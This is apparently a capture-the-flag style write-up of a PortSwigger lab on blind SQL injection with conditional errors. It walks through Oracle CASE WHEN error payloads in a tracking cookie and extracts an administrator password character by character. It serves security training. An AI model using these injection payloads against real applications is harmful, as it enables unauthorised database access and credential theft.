
# Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

There is a SQL injection in the cookie. First we find we do not get errors with the payload:

```
COOKIE'+and'1'='1
```

```
Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
```



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/1.png)

In MySQL it would be:

```
COOKIE' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

But it is Oracle so we must use:

```
COOKIE' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

```
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
```

With 1=1 we get a 500 error code:



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/2.png)

With 1=2 we get a 200 code:



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/3.png)

For the first letter of the administrator user's password we will user (using SUBSTR because it is Oracle):

```
COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

```
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
```



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/4.png)

We send this to the Intruder and test all letters and numbers until one generates a 500 error code:



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/5.png)

We get the first letter is "0":



![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/6.png)

If we continue we get the password 01k6j5tbrjpd9lpdk4zs